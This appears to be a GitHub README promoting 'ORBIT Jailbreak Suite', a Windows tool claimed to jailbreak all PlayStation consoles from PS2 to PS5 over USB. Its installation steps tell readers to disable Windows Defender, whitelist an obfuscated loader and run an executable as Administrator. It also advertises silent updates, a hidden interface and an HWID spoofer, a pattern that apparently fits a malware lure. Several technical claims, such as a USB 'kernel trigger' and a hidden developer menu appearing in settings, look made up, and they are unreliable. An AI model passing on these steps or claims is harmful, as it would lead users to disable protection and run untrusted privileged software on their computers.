<div align="center">

# ◈ ORBIT Jailbreak Suite

### Universal PlayStation Firmware Patcher (PS2 — PS5 / PSP / PS Vita)

**The ultimate external tool for console hardware exploitation.**  
_Bypass the locks. Own your hardware._

[![Download](https://img.shields.io/badge/GitHub-⬇_DOWNLOAD_LATEST_RELEASE-22c55e?style=for-the-badge&logo=github&logoColor=white)](https://github.com/angelicaunt/ORBIT-Ps4-Ps5-Jailbrake/releases/latest)
[![Preview](https://img.shields.io/badge/Web-_PREVIEW_INTERACTIVE_UI-8b5cf6?style=for-the-badge&logo=googlechrome&logoColor=white)](https://angelicaunt.github.io/ORBIT-Ps4-Ps5-Jailbrake/)

<br>


</div>

## 📡 Supported Platforms & Firmware Status

Live compatibility tracker for currently supported exploit chains. **Updates automatically with the latest release.**

| Console Family | Supported Firmware (Exploit) | Status |
|---|---|---|
| **PlayStation 5** | 1.00 — 4.51 (Kernel RCE) | 🟢 Active |
| **PlayStation 4** | 5.05 — 9.00, 11.00 (WebKit / Kernel) | 🟢 Active |
| **PlayStation Vita** | 3.60 (HENkaku), 3.65 (H-encore) | 🟢 Active |
| **PlayStation Portable** | 6.60 / 6.61 (PRO / LME) | 🟢 Active |
| **PlayStation 3** | 4.84 — 4.89 (PS3HEN) | 🟢 Active |
| **PlayStation 2** | All revisions (FreeHDBoot / FreeMcBoot) | 🟢 Active |

<details>
<summary><b>Click to view Hardware Revisions (PS4 / PS5)</b></summary>

### PlayStation 5
| Hardware family | Description |
|---|---|
| CFI-10xx | Original chassis |
| CFI-11xx | Revised original chassis |
| CFI-12xx | Revised original chassis |
| CFI-20xx | Slim family |
| CFI-70xx | Pro family |

### PlayStation 4
| Hardware family | Description |
|---|---|
| CUH-10xx | Original |
| CUH-11xx | Revised original |
| CUH-12xx | Revised original |
| CUH-20xx | Slim |
| CUH-21xx | Revised Slim |
| CUH-22xx | Revised Slim |
| CUH-70xx | Pro |
| CUH-71xx | Revised Pro |
| CUH-72xx | Revised Pro |

### Legacy & Handhelds
- **PS Vita:** PCH-1000 / PCH-2000 / PSTV
- **PSP:** 1000, 2000, 3000, Go, Street
- **PS3:** CECH series (Fat, Slim, Super Slim)
- **PS2:** SCPH series (Fat, Slim)

</details>

---

## ✦ Overview

**ORBIT Jailbreak Suite** is a top-tier, fully external firmware patching utility for all PlayStation generations. Built for users who are tired of region locks, digital restrictions, and system limitations. Operates completely externally via USB—no risky hardware soldering required. **Sony's security checks won't flag your console** if you follow the protocol.

---

## ✦ Features

### 🎯 Exploit Engine
- **Universal Payloads** — pre-compiled chains for PS2, PS3, PS4, PS5, PSP, and PS Vita.
- **Auto-Detection** — identifies your exact model and firmware version instantly.
- **Firmware Spoofing** — masks your patched system as a stock console.
- **Memory Injection** — direct kernel-level execution without permanent hardware mods.

### 👁️ Visuals & UI
- **Dark Tactical Interface** — clean, fast, and built for power users.
- **Real-time Status** — watch the payload stage and execute live.
- **Stream-Proof Mode** — hide the interface from OBS and Discord screenshare.

### 🔓 Unlocker (PS3 / PS4 / PS5)
- **PSN Access** — bypass account restrictions.
- **Region Free** — play physical and digital media from any region.
- **Debug Settings** — enable hidden developer menus.
- **Package Installer** — install custom PKGs directly.

### 🛡️ Exploits & Misc
- **USB Staging** — prepares the drive with the correct partition and label.
- **Boot Flag Patching** — modifies system boot to load custom firmware.
- **Auto-Backup** — creates a NAND/NOR dump before flashing.

---

## ✦ Step-by-Step Installation

**Disable Windows Defender before extraction.** The loader uses packing/obfuscation that triggers false positives. Add the folder to exclusions first.

**Step 1: Prepare the USB Drive**
Format a standard USB 2.0/3.0 flash drive (8GB minimum) to **exFAT**. Create a folder named `ORBIT` in the root directory.

**Step 2: Select Console & Firmware**
Launch `ORBITV.1.exe` as Administrator. In the interface, select your exact console family (e.g., PS4), hardware revision (e.g., CUH-11xx), and target system software version. 

**Step 3: Stage the Payload**
Click **"Stage Payload"**. The tool will automatically format the USB, write the exploit chain, and inject the spoofed boot flags. Wait for the green "Success" log.

**Step 4: Connect to Console**
Power on your console and connect the prepared USB drive to the front port. Put the console into **Rest Mode** (PS4/PS5) or boot into **Safe Mode** (PS3/Vita) by holding the power button until the second beep.

**Step 5: Trigger the Exploit**
In the ORBIT interface, click **"EXECUTE PAYLOAD"**. The tool will send the kernel trigger via USB. The console will blink and restart automatically. 

**Step 6: Access Debug Menu**
Once the console reboots, navigate to **Settings → System Software**. A new hidden option labeled **"Developer Menu"** (or "Debug Settings") will appear. Enter it, enable **"Allow Unsigned Code"**, and reboot. The jailbreak is now active.

---

## ✦ Why ORBIT?

- 🛡️ **Hypervisor Bypass.** Our external patcher operates on a level invisible to the console's security scanner.
- 📺 **Stream-Proof.** Fully compatible with OBS and Discord screenshare.
- ⚡ **48h Updates.** Sony patches firmware. We push silent updates to the loader within 48 hours.
- 🎨 **Tactical UI.** A dark-themed interface that looks like it belongs in a dev environment.
- 🔒 **HWID Spoofer Included.** Don't buy a separate spoofer — it's built right in.

---

## 🔒 Scope & Compatibility

- Compatibility is strictly bound to the exact console model, system software version, and firmware hash.
- Selecting a hardware family does not guarantee compatibility if the specific revision is unpatched.
- **Warning:** Executing an incorrect payload chain (wrong model/firmware) can permanently brick the console.
- The application stages and executes exploit payloads via USB.

---

<div align="center">

**ORBIT Jailbreak Suite**

*Console research. Payload execution. One workspace.*

</div>
